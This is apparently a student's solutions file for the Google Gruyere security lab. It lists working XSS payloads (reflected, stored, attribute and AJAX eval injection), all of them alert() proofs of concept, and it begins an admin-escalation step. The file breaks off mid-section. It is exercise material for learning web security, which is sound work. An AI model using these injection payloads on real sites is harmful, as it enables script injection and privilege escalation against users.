# Solutions

# Part 1

## Can you upload a file that allows you to execute arbitrary script on the google-gruyere.appspot.com domain?
- I can upload everything, so I can also upload html and html can contain scripts. And Data is not escaped and displayed in the browser.
- Solution: upload some html with `<script>alert(1);</script>` in it

## Find a reflected XSS attack. What we want is a URL that when clicked on will execute a script
- https://google-gruyere.appspot.com/639931924029465370724892746766770664325/snippets.gtl?uid=<script>alert(1);</script>

## Now find a stored XSS. What we want to do is put a script in a place where Gruyere will serve it back to another user.
- add `<script>alert(1);</script>` as homepage in private profile and when visiting a users site, the script will be executed

## You can also do XSS by injecting a value into an HTML attribute. Inject a script by setting the color value in a profile.
- the color is used inside a `<span>` where onload is not possible
- but onmouseover is possible
- like when using a sql injection, we can add `'`to exploit the app
- color_name' onmouseover='alert("COLOR XSS")

## Find an XSS attack that uses a bug in Gruyere's AJAX code.
- playing around and inserting different kinds of "", <>, scripts, etc, yields an : `SyntaxError: Unexpected token ';'. Expected '}' to end an object literal.`
- so some of the code seems to be interpreted as valid js code
- 'eval('(' + httpRequest.responseText + ')');'
- " + (alert(1),"") + ", will cause the eval function to execute javascript

## Find a URL that when clicked on will execute a script using one of Gruyere's AJAX features.
- https://google-gruyere.appspot.com/639931924029465370724892746766770664325/snippets.gtl?uid=<script>alert(1);</script>


# Part 2
## Convert your account to an administrator account.

- there are url encoded params that are evaluated on the server site, which we can see by digging into the source code:
```python
    self._AddParameter('is_author', params, profile_data)
    self._AddParameter('is_admin', params, profile_data)
```

##